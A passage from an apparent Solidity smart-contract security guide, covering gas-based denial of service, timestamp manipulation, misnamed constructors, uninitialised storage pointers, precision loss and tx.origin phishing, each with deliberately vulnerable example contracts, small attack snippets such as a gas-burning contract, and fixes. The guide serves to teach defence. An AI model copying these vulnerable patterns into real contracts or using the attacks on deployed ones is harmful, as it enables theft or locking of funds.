    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">contractBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">address</span>(<span class="hljs-keyword">this</span>).balance;
    }
}
</pre></div>

<p>Notice that on line [17] we perform an external call sending 1% of the
contract balance  to a user-specified account. The reason the <code>CALL</code> opcode is used, is to ensure that
the owner still gets paid, even if the external call reverts. The issue is that
the transaction will send all of its gas (in reality, only most of the transaction gas is sent, some is left to finish processing the call) to the external call. If the user were malicious they could create a contract that would consume all the gas, and force all transactions to <code>withdraw()</code> to fail, due to running out of gas.</p>
<p>For example, consider the following malicious contract that consumes all gas,</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">ConsumeAllGas</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">payable</span> </span>{
        <span class="hljs-comment">// an assert consumes all transaction gas, unlike a</span>
        <span class="hljs-comment">//revert which returns the remaining gas</span>
        <span class="hljs-built_in">assert</span>(<span class="hljs-number">1</span>==<span class="hljs-number">2</span>);
    }
}
</pre></div>

<p>If a withdrawal partner decided they didn't like the owner of the contract.
They could set the partner address to this contract and lock all the funds in
the <code>TrickleWallet</code> contract forever.</p>
<p>To prevent such DOS attack vectors, ensure a gas stipend is specified in an
external call, to limit the amount of gas that that transaction can use. In our
example, we could remedy this attack by changing line [17] to:</p>
<div class="highlight"><pre class="hljs language-scss">partner<span class="hljs-selector-class">.call</span><span class="hljs-selector-class">.gas</span>(<span class="hljs-number">50000</span>)<span class="hljs-selector-class">.value</span>(amountToSend)();
</pre></div>

<p>This modification allows only 50,000 gas to be spent on the external
transaction. The <code>owner</code> may set a gas price larger than this, in order to have
their transaction complete, regardless of how much the external transaction
uses.</p>
<p><strong>2. Looping through externally manipulated mappings or arrays</strong> - In my adventures I've seen various forms of this kind of pattern. Typically it appears in scenarios where an <code>owner</code> wishes to distribute tokens amongst their investors, and do so with a <code>distribute()</code>-like function as can be seen in the example contract:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">DistributeTokens</span> </span>{
    <span class="hljs-built_in">address</span> <span class="hljs-keyword">public</span> owner; <span class="hljs-comment">// gets set somewhere</span>
    <span class="hljs-built_in">address</span>[] investors; <span class="hljs-comment">// array of investors</span>
    <span class="hljs-built_in">uint</span>[] investorTokens; <span class="hljs-comment">// the amount of tokens each investor gets</span>

    <span class="hljs-comment">// ... extra functionality, including transfertoken()</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invest</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
        investors.push(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>);
        investorTokens.push(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> * <span class="hljs-number">5</span>); <span class="hljs-comment">// 5 times the wei sent</span>
        }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">distribute</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == owner); <span class="hljs-comment">// only owner</span>
        <span class="hljs-keyword">for</span>(<span class="hljs-built_in">uint</span> i = <span class="hljs-number">0</span>; i &lt; investors.length; i++) {
            <span class="hljs-comment">// here transferToken(to,amount) transfers "amount" of tokens to the address "to"</span>
            transferToken(investors[i],investorTokens[i]);
        }
    }
}
</pre></div>

<p>Notice that the loop in this contract runs over an array which can be artificially inflated. An attacker can create many user accounts making the <code>investor</code> array large. In principle this can be done such that the gas required to execute the for loop exceeds the block gas limit, essentially making the <code>distribute()</code> function inoperable.</p>
<p><strong>3. Owner operations</strong> - Another common pattern is where owners have specific privileges in contracts and must perform some task in order for the contract to proceed to the next state. One example would be an ICO contract that requires the owner to <code>finalize()</code> the contract which then allows tokens to be transferable, i.e.</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-built_in">bool</span> <span class="hljs-keyword">public</span> isFinalized = <span class="hljs-literal">false</span>;
<span class="hljs-built_in">address</span> <span class="hljs-keyword">public</span> owner; <span class="hljs-comment">// gets set somewhere</span>

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finalize</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
    <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == owner);
    isFinalized == <span class="hljs-literal">true</span>;
}

<span class="hljs-comment">// ... extra ICO functionality</span>

<span class="hljs-comment">// overloaded transfer function</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _to, <span class="hljs-built_in">uint</span> _value</span>) <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">bool</span></span>) </span>{
    <span class="hljs-built_in">require</span>(isFinalized);
    <span class="hljs-keyword">super</span>.<span class="hljs-built_in">transfer</span>(_to,_value)
}

...
</pre></div>

<p>In such cases, if a privileged user loses their private keys, or becomes inactive, the entire token contract becomes inoperable. In this case, if the <code>owner</code> cannot call <code>finalize()</code> no tokens can be transferred; i.e. the entire operation of the token ecosystem hinges on a single address.</p>
<p><strong>4. Progressing state based on external calls</strong> - Contracts are sometimes written such that in order to progress to a new state
requires sending ether to an address, or waiting for some input from an
external source.  These patterns can lead to DOS attacks, when the external
call fails or is prevented for external reasons. In the example of sending
ether, a user can create a contract which does not accept ether. If a contract
requires ether to be withdrawn (consider a time-locking contract that requires all
    ether to be withdrawn before being useable again) in order to progress to a new state, the
contract will never achieve the new state as ether can never be sent to the
user's contract which does not accept ether.</p>
<h3 id="dos-prev">Preventative Techniques</h3>

<p>In the first example, contracts should not loop through data structures that can be artificially manipulated by external users. A withdrawal pattern is recommended, whereby each of the investors call a withdraw function to claim tokens independently.</p>
<p>In the second example a privileged user was required to change the state of the contract. In such examples (wherever possible) a fail-safe can be used in the event that the <code>owner</code> becomes incapacitated. One solution could be setting up the <code>owner</code> as a multisig contract. Another solution is to use a timelock, where the require on line [13] could include a time-based mechanism, such as <code>require(msg.sender == owner || now &gt; unlockTime)</code> which allows any user to finalise after a period of time, specified by <code>unlockTime</code>. This kind of mitigation technique can be used in the third example also. If external calls are required to progress to a new state, account for their possible failure and potentially add a time-based state progression in the event that the desired call never comes.</p>
<p><em>Note: Of course there are centralised alternatives to these suggestions where one can add a <code>maintenanceUser</code> who can come along and fix problems with DOS-based attack vectors if need be. Typically these kinds of contracts contain trust issues over the power of such an entity, but that is not a conversation for this section.</em></p>
<h3 id="dos-example">Real-World Examples: GovernMental </h3>

<p><a href="http://governmental.github.io/GovernMental/">GovernMental</a> was an old Ponzi scheme that accumulated quite a large amount of ether. In fact, at one point it had accumulated 1100 ether. Unfortunately, it was susceptible to the DOS vulnerabilities mentioned in this section. <a href="https://www.reddit.com/r/ethereum/comments/4ghzhv/governmentals_1100_eth_jackpot_payout_is_stuck/">This Reddit Post</a> describes how the contract required the deletion of a large mapping in order to withdraw the ether. The deletion of this mapping had a gas cost that exceeded the block gas limit at the time, and thus was not possible to withdraw the 1100 ether. The contract address is <a href="https://etherscan.io/address/0xf45717552f12ef7cb65e95476f217ea008167ae3">0xF45717552f12Ef7cb65e95476F217Ea008167Ae3</a> and you can see from transaction <a href="https://etherscan.io/tx/0x0d80d67202bd9cb6773df8dd2020e7190a1b0793e8ec4fc105257e8128f0506b">0x0d80d67202bd9cb6773df8dd2020e7190a1b0793e8ec4fc105257e8128f0506b</a> that the 1100 ether was finally obtained with a transaction that used 2.5M gas (after the block gas limit allowed such a transaction).</p>
<h2 id="block-timestamp"><span id="SP-12">12. Block Timestamp Manipulation</span></h2>

<p>Block timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the <a href="https://blog.sigmaprime.io/solidity-security.html#entropy">Entropy Illusion</a> section for further details), locking funds for periods of time and various state-changing conditional statements that are time-dependent. Miner's have the ability to adjust timestamps slightly which can prove to be quite dangerous if block timestamps are used incorrectly in smart contracts.</p>
<p>Some useful references for this are: <a href="http://solidity.readthedocs.io/en/latest/units-and-global-variables.html#block-and-transaction-properties">The Solidity Docs</a>, this <a href="https://ethereum.stackexchange.com/questions/413/can-a-contract-safely-rely-on-block-timestamp?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa">Stack Exchange Question</a>.</p>
<h3 id="block-timestamp-vuln">The Vulnerability</h3>

<p><code>block.timestamp</code> or its alias <code>now</code> can be manipulated by miners if they have some incentive to do so. Let's construct a simple game, which would be vulnerable to miner exploitation,</p>
<p><code>roulette.sol</code>:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Roulette</span> </span>{
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> pastBlockTime; <span class="hljs-comment">// Forces one bet per block</span>

    <span class="hljs-function"><span class="hljs-literal">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> <span class="hljs-keyword">payable</span> </span>{} <span class="hljs-comment">// initially fund contract</span>

    <span class="hljs-comment">// fallback function used to make a bet</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> == <span class="hljs-number">10</span> <span class="hljs-built_in">ether</span>); <span class="hljs-comment">// must send 10 ether to play</span>
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">now</span> != pastBlockTime); <span class="hljs-comment">// only 1 transaction per block</span>
        pastBlockTime = <span class="hljs-built_in">now</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">now</span> % <span class="hljs-number">15</span> == <span class="hljs-number">0</span>) { <span class="hljs-comment">// winner</span>
            <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(<span class="hljs-keyword">this</span>.balance);
        }
    }
}
</pre></div>

<p>This contract behaves like a simple lottery. One transaction per block can bet <code>10 ether</code> for a chance to win the balance of the contract. The assumption here is that, <code>block.timestamp</code> is uniformly distributed about the last two digits. If that were the case, there would be a 1/15 chance of winning this lottery.</p>
<p>However, as we know, miners can adjust the timestamp, should they need to.  In this particular case, if enough ether pooled in the contract, a miner who solves a block is incentivised to choose a timestamp such that <code>block.timestamp</code> or <code>now</code> modulo 15 is <code>0</code>. In doing so they may win the ether locked in this contract along with the block reward. As there is only one person allowed to bet per block, this is also vulnerable to <a href="https://blog.sigmaprime.io/solidity-security.html#race-conditions">front-running</a> attacks.</p>
<p>In practice, block timestamps are monotonically increasing and so miners cannot choose arbitrary block timestamps (they must be larger than their predecessors). They are also limited to setting blocktimes not too far in the future as these blocks will likely be rejected by the network (nodes will not validate blocks whose timestamps are in the future).</p>
<h3 id="block-timestamp-prev">Preventative Techniques</h3>

<p>Block timestamps should not be used for entropy or generating random numbers - i.e. they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state (if assumed to be random).</p>
<p>Time-sensitive logic is sometimes required; i.e. unlocking contracts (timelocking), completing an ICO after a few weeks or enforcing expiry dates. It is sometimes recommend to use <code>block.number</code> (see the <a href="http://solidity.readthedocs.io/en/latest/units-and-global-variables.html#block-and-transaction-properties">Solidity docs</a>) and an average block time to estimate times; .i.e. <code>1 week</code> with a <code>10 second</code> block time, equates to approximately, <code>60480 blocks</code>. Thus, specifying a block number at which to change a contract state can be more secure as miners are unable to manipulate the block number as easily. The <a href="https://etherscan.io/address/0x0d8775f648430679a709e98d2b0cb6250d2887ef#code">BAT ICO</a> contract employed this strategy.</p>
<p>This can be unnecessary if contracts aren't particularly concerned with miner manipulations of the block timestamp, but it is something to be aware of when developing contracts.</p>
<h3 id="block-timestamp-example">Real-World Example: GovernMental </h3>

<p><a href="http://governmental.github.io/GovernMental/">GovernMental</a> was an old Ponzi scheme that accumulated quite a large amount of ether. It was also vulnerable to a timestamp-based attack. The contract payed out to the player who was the last player to join (for at least one minute) in a round. Thus, a miner who was a player, could adjust the timestamp (to a future time, to make it look like a minute had elapsed) to make it appear that the player was the last to join for over a minute (even though this is not true in reality). More detail on this can be found in the <a href="https://applicature.com/blog/history-of-ethereum-security-vulnerabilities-hacks-and-their-fixes">History of Ethereum Security Vulnerabilities Post</a> by Tanya Bahrynovska.</p>
<h2 id="constructors"><span id="SP-13">13. Constructors with Care</span></h2>

<p>Constructors are special functions which often perform critical, privileged tasks when initialising contracts. Before solidity <code>v0.4.22</code> constructors were defined as functions that had the same name as the contract that contained them. Thus, when a contract name gets changed in development, if the constructor name isn't changed, it becomes a normal, callable function. As you can imagine, this can (and has) lead to some interesting contract hacks.</p>
<p>For further reading, I suggest the reader attempt the <a href="https://github.com/OpenZeppelin/ethernaut">Ethernaught Challenges</a> (in particular the Fallout level).</p>
<h3 id="constructors-vuln">The Vulnerability</h3>

<p>If the contract name gets modified, or there is a typo in the constructor's name such that it no longer matches the name of the contract, the constructor will behave like a normal function. This can lead to dire consequences, especially if the constructor is performing privileged operations. Consider the following contract</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">OwnerWallet</span> </span>{
    <span class="hljs-built_in">address</span> <span class="hljs-keyword">public</span> owner;

    <span class="hljs-comment">//constructor</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ownerWallet</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _owner</span>) <span class="hljs-title">public</span> </span>{
        owner = _owner;
    }

    <span class="hljs-comment">// fallback. Collect ether.</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">payable</span> </span>{}

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == owner);
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(<span class="hljs-keyword">this</span>.balance);
    }
}
</pre></div>

<p>This contract collects ether and only allows the owner to withdraw all the ether by calling the <code>withdraw()</code> function. The issue arises due to the fact that the constructor is not exactly named after the contract. Specifically, <code>ownerWallet</code> is not the same as <code>OwnerWallet</code>. Thus, any user can call the <code>ownerWallet()</code> function, set themselves as the owner and then take all the ether in the contract by calling <code>withdraw()</code>.</p>
<h3 id="constructors-prev">Preventative Techniques</h3>

<p>This issue has been primarily addressed in the Solidity compiler in version <code>0.4.22</code>. This version introduced a <code>constructor</code> keyword which specifies the constructor, rather than requiring the name of the function to match the contract name. Using this keyword to specify constructors is recommended to prevent naming issues as highlighted above.</p>
<h3 id="constructors-example">Real-World Example: Rubixi</h3>

<p>Rubixi (<a href="https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code">contract code</a>) was another pyramid scheme that exhibited this kind of vulnerability. It was originally called <code>DynamicPyramid</code> but the contract name was changed before deployment to <code>Rubixi</code>. The constructor's name wasn't changed, allowing any user to become the <code>creator</code>. Some interesting discussion related to this bug can be found on this <a href="https://bitcointalk.org/index.php?topic=1400536.60">Bitcoin Thread</a>. Ultimately, it allowed users to fight for <code>creator</code> status to claim the fees from the pyramid scheme. More detail on this particular bug can be found <a href="https://applicature.com/blog/history-of-ethereum-security-vulnerabilities-hacks-and-their-fixes">here</a>.</p>
<h2 id="storage"><span id="SP-14">14. Uninitialised Storage Pointers</span></h2>

<p>The EVM stores data either as <code>storage</code> or as <code>memory</code>. Understanding exactly how this is done and the default types for local variables of functions is highly recommended when developing contracts. This is because it is possible to produce vulnerable contracts by inappropriately initialising variables.</p>
<p>To read more about <code>storage</code> and <code>memory</code> in the EVM, see the <a href="http://solidity.readthedocs.io/en/latest/types.html#data-location">Solidity Docs: Data Location</a>, <a href="http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage">Solidity Docs: Layout of State Variables in Storage</a>, <a href="http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-in-memory">Solidity Docs: Layout in Memory</a>.</p>
<p><em>This section is based off the excellent <a href="https://medium.com/cryptronics/storage-allocation-exploits-in-ethereum-smart-contracts-16c2aa312743">post by Stefan Beyer</a>. Further reading on this topic can be found from Sefan's inspiration, which is this <a href="https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/">reddit thread</a>.</em></p>
<h3 id="storage-vuln">The Vulnerability</h3>

<p>Local variables within functions default to <code>storage</code> or <code>memory</code> depending on their type. Uninitialised local <code>storage</code> variables can point to other unexpected storage variables in the contract, leading to intentional (i.e. the developer intentionally puts them there to attack later) or unintentional vulnerabilities.</p>
<p>Let's consider the following, relatively simple name registrar contract:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-comment">// A Locked Name Registrar</span>
<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">NameRegistrar</span> </span>{

    <span class="hljs-built_in">bool</span> <span class="hljs-keyword">public</span> unlocked = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// registrar locked, no name updates</span>

    <span class="hljs-function"><span class="hljs-keyword">struct</span> <span class="hljs-title">NameRecord</span> </span>{ <span class="hljs-comment">// map hashes to addresses</span>
        <span class="hljs-built_in">bytes32</span> name;
        <span class="hljs-built_in">address</span> mappedAddress;
    }

    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; NameRecord) <span class="hljs-keyword">public</span> registeredNameRecord; <span class="hljs-comment">// records who registered names</span>
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">bytes32</span> =&gt; <span class="hljs-built_in">address</span>) <span class="hljs-keyword">public</span> resolve; <span class="hljs-comment">// resolves hashes to addresses</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-built_in">bytes32</span> _name, <span class="hljs-built_in">address</span> _mappedAddress</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-comment">// set up the new NameRecord</span>
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress;

        resolve[_name] = _mappedAddress;
        registeredNameRecord[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = newRecord;

        <span class="hljs-built_in">require</span>(unlocked); <span class="hljs-comment">// only allow registrations if contract is unlocked</span>
    }
}
</pre></div>

<p>This simple name registrar has only one function. When the contract is <code>unlocked</code>, it allows anyone to register a name (as a <code>bytes32</code> hash) and map that name to an address. Unfortunately, this registrar is initially locked and the <code>require</code> on line [23] prevents <code>register()</code> from adding name records. There is however a vulnerability in this contract, that allows name registration regardless of the <code>unlocked</code> variable.</p>
<p>To discuss this vulnerability, first we need to understand how storage works in Solidity. As a high level overview (without any proper technical detail -  I suggest reading the Solidity docs for a proper review), state variables are stored sequentially in <em>slots</em> as they appear in the contract (they can be grouped together, but not in this example, so we won't worry about that). Thus, <code>unlocked</code> exists in <code>slot 0</code>, <code>registeredNameRecord</code> exists in <code>slot 1</code> and <code>resolve</code> in <code>slot 2</code> etc. Each of these slots are of byte size 32 (there are added complexities with mappings which we ignore for now). The boolean <code>unlocked</code> will look like <code>0x000...0</code> (64 <code>0</code>'s, excluding the <code>0x</code>) for <code>false</code> or <code>0x000...1</code>(63 <code>0</code>'s) for <code>true</code>. As you can see, there is a significant waste of storage in this particular example.</p>
<p>The next piece of information that we need, is that Solidity defaults complex data types, such as <code>structs</code>, to <code>storage</code> when initialising them as local variables. Therefore, <code>newRecord</code> on line [16] defaults to <code>storage</code>. The vulnerability is caused by the fact that <code>newRecord</code> is not initialised. Because it defaults to storage, it becomes a pointer to storage and because it is uninitialised, it points to slot <code>0</code> (i.e. where <code>unlocked</code> is stored). Notice that on lines [17] and [18] we then set <code>nameRecord.name</code> to <code>_name</code> and <code>nameRecord.mappedAddress</code> to <code>_mappedAddress</code>, this in effect changes the storage location of slot 0 and slot 1 which modifies both <code>unlocked</code> and the storage slot associated with <code>registeredNameRecord</code>.</p>
<p>This means that <code>unlocked</code> can be directly modified, simply by the <code>bytes32 _name</code> parameter of the <code>register()</code> function. Therefore, if the last byte  of <code>_name</code> is non-zero, it will modify the last byte of storage <code>slot 0</code> and directly change <code>unlocked</code> to <code>true</code>. Such <code>_name</code> values will pass the <code>require()</code> on line [23] as we are setting <code>unlocked</code> to <code>true</code>. Try this in Remix. Notice the function will pass if you use a <code>_name</code> of the form: <code>0x0000000000000000000000000000000000000000000000000000000000000001</code></p>
<h3 id="storage-prev">Preventative Techniques</h3>

<p>The Solidity compiler raises uninitialised storage variables as warnings, thus developers should pay careful attention to these warnings when building smart contracts. The current version of mist (0.10), doesn't allow these contracts to be compiled. It is good practice to explicitly use the <code>memory</code> or <code>storage</code> keywords when dealing with complex types to ensure they behave as expected. As of Solidity version <code>0.5.0</code> use of <code>memory</code> and <code>storage</code> are mandatory.</p>
<h3 id="storage-example">Real-World Examples: Honey Pots: OpenAddressLottery and CryptoRoulette</h3>

<p>A honey pot named OpenAddressLottery (<a href="https://etherscan.io/address/0x741f1923974464efd0aa70e77800ba5d9ed18902#code">contract code</a>) was deployed that used this uninitialised storage variable querk to collect ether from some would-be hackers. The contract is rather in-depth, so I will leave the discussion to this <a href="https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/">reddit thread</a> where the attack is quite clearly explained.</p>
<p>Another honey pot, CryptoRoulette (<a href="https://etherscan.io/address/0x8685631276cfcf17a973d92f6dc11645e5158c0c#code">contract code</a>) also utilises this trick to try and collect some ether. If you can't figure out how the attack works, see <a href="https://medium.com/@jsanjuas/an-analysis-of-a-couple-ethereum-honeypot-contracts-5c07c95b0a8d">An analysis of a couple Ethereum honeypot contracts</a> for an overview of this contract and others.</p>
<h2 id="precision"><span id="SP-15">15. Floating Points and Precision</span></h2>

<p>As of this writing (Solidity v0.4.24), fixed point or floating point numbers are not supported. This means that floating point representations must be made with the integer types in Solidity. This can lead to errors/vulnerabilities if not implemented correctly.</p>
<p>For further reading, see <a href="https://github.com/ethereum/wiki/wiki/Safety#beware-rounding-with-integer-division">Ethereum Contract Security Techniques and Tips - Rounding with Integer Division</a>,</p>
<h3 id="precision-vuln">The Vulnerability</h3>

<p>As there is no fixed point type in Solidity, developers are required to implement their own using the standard integer data types. There are a number of pitfalls developers can run into during this process. I will try to highlight some of these in this section.</p>
<p>Let's begin with a code example (let's ignore any over/under flow issues for simplicity).</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">FunWithNumbers</span> </span>{
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">constant</span> <span class="hljs-keyword">public</span> tokensPerEth = <span class="hljs-number">10</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">constant</span> <span class="hljs-keyword">public</span> weiPerEth = <span class="hljs-number">1e18</span>;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint</span>) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buyTokens</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
        <span class="hljs-built_in">uint</span> tokens = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>/weiPerEth*tokensPerEth; <span class="hljs-comment">// convert wei to eth, then multiply by token rate</span>
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += tokens;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sellTokens</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span> tokens</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt;= tokens);
        <span class="hljs-built_in">uint</span> eth = tokens/tokensPerEth;
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] -= tokens;
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(eth*weiPerEth); <span class="hljs-comment">//</span>
    }
}
</pre></div>

<p>This simple token buying/selling contract has some obvious problems in the buying and selling of tokens. Although the mathematical calculations for buying and selling tokens are correct, the lack of floating point numbers will give erroneous results. For example, when buying tokens on line [7], if the value is less than <code>1 ether</code> the initial division will result in <code>0</code>, leaving the final multiplication <code>0</code> (i.e. <code>200 wei</code> divided by <code>1e18</code> <code>weiPerEth</code> equals <code>0</code>). Similarly, when selling tokens, any tokens less than <code>10</code> will also result in <code>0 ether</code>. In fact, rounding here is always down, so selling <code>29 tokens</code>, will result in <code>2 ether</code>.</p>
<p>The issue with this contract is that the precision is only to the nearest <code>ether</code> (i.e. <code>1e18 wei</code>). This can sometimes get tricky when dealing with <code>decimals</code> in <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> tokens when you need higher precisions.</p>
<h3 id="precision-prev">Preventative Techniques</h3>

<p>Keeping the right precision in your smart contracts is very important, especially when dealing ratios and rates which reflect economic decisions.</p>
<p>You should ensure that any ratios or rates you are using allow for large numerators in fractions. For example, we used the rate <code>tokensPerEth</code> in our example. It would have been better to use <code>weiPerTokens</code> which would be a large number. To solve for the amount of tokens we could do <code>msg.sender/weiPerTokens</code>. This would give a more precise result.</p>
<p>Another tactic to keep in mind, is to be mindful of order of operations. In the above example, the calculation to purchase tokens was <code>msg.value/weiPerEth*tokenPerEth</code>. Notice that the division occurs before the multiplication. This example would have achieved a greater precision if the calculation performed the multiplication first and then the division, i.e. <code>msg.value*tokenPerEth/weiPerEth</code>.</p>
<p>Finally, when defining arbitrary precision for numbers it can be a good idea to convert variables into higher precision, perform all mathematical operations, then finally when needed, convert back down to the precision for output. Typically <code>uint256</code>'s are used (as they are optimal for gas usage) which give approximately 60 orders of magnitude in their range, some of which can be dedicated to the precision of mathematical operations. It may be the case that it is better to keep all variables in high precision in solidity and convert back to lower precisions in external apps (this is essentially how the <code>decimals</code> variable works in <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20 Token</a> contracts). To see examples of how this can be done and the libraries to do this, I recommend looking at the <a href="https://github.com/dapphub/ds-math">Maker DAO DSMath</a>. They use some funky naming, <code>WAD</code>s and <code>RAY</code>s but the concept is useful.</p>
<h3 id="precision-example">Real-World Example: Ethstick</h3>

<p>I couldn't find a good example where rounding has caused a severe issue in a contract, but I'm sure there are plenty out there. Feel free to update this if you have a good one in mind.</p>
<p>For lack of a good example, I want to draw your attention to <a href="https://etherscan.io/address/0xbA6284cA128d72B25f1353FadD06Aa145D9095Af#code">Ethstick</a> mainly because I like the cool naming within the contract. This contract doesn't use any extended precision, however, it deals with <code>wei</code>. So this contract will have issues of rounding, but only at the <code>wei</code> level of precision. It has some more serious flaws, but these are relating back to the difficulty in getting entropy on the blockchain (see <a href="https://blog.sigmaprime.io/solidity-security.html#entropy-illusion">Entropty Illusion</a>). For a further discussion on the Ethstick contract, I'll refer you to another post of Peter Venesses, <a href="https://vessenes.com/ethereum-contracts-are-going-to-be-candy-for-hackers/">Ethereum Contracts Are Going to be Candy For Hackers</a>.</p>
<h2 id="tx-origin"><span id="SP-16">16. Tx.Origin Authentication<span></span></span></h2>

<p>Solidity has a global variable, <code>tx.origin</code> which traverses the entire call stack and returns the address of the account that originally sent the call (or transaction). Using this variable for authentication in smart contracts leaves the contract vulnerable to a phishing-like attack.</p>
<p>For further reading, see <a href="https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin">Stack Exchange Question</a>, <a href="https://vessenes.com/tx-origin-and-ethereum-oh-my/">Peter Venesses's Blog</a> and <a href="https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514">Solidity - Tx.Origin attacks</a>.</p>
<h3 id="tx-origin-vuln">The Vulnerability</h3>

<p>Contracts that authorise users using the <code>tx.origin</code> variable are typically vulnerable to phishing attacks which can trick users into performing authenticated actions on the vulnerable contract.</p>
<p>Consider the simple contract,</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Phishable</span> </span>{
    <span class="hljs-built_in">address</span> <span class="hljs-keyword">public</span> owner;

    <span class="hljs-function"><span class="hljs-literal">constructor</span> (<span class="hljs-params"><span class="hljs-built_in">address</span> _owner</span>) </span>{
        owner = _owner;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{} <span class="hljs-comment">// collect ether</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawAll</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _recipient</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">tx</span>.origin == owner);
        _recipient.<span class="hljs-built_in">transfer</span>(<span class="hljs-keyword">this</span>.balance);
    }
}
</pre></div>

